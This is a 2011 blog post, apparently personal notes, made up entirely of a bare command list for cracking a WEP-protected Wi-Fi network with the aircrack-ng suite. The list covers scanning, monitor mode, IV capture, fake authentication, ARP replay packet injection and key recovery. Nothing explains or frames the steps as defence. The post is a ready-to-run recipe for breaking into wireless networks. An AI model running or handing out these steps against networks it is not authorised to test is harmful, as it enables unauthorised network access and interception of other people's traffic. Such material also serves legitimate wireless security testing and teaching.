---
layout: post
status: publish
published: true
title: WIFI WEP AirCrack-ng
author:
  display_name: Pavel Dostál
  login: quick
  email: pdostal@pdostal.cz
  url: http://pdostal.cz/
author_login: quick
author_email: pdostal@pdostal.cz
author_url: http://pdostal.cz/
wordpress_id: 10
wordpress_url: http://pdostal.cz/?p=10
date: '2011-03-10 10:05:00 +0100'
date_gmt: '2011-03-10 10:05:00 +0100'
categories:
- Software
tags: []
comments: []
---
<ul>
<li>iwlist IFACE scan</li>
<li>ip l s wlan1 down</li>
<li>iwconfig IFACE mode Monitor channel CHAN</li>
<li>airmon-ng start IFACE</li>
<li>airodump-ng --bssid DESTMAC --ivs -w FILE --ch KANAL IFACE</li>
<li>aireplay-ng -1 0 -e ESSID -a DESTMAC -h SRCMAC IFACE</li>
<li>aireplay-ng -3 -b DESTMAC -h SRCMAC -x 600 IFACE</li>
<li>aircrack-ng -z -b DESTMAC FILE.ivs
<li>
</ul>
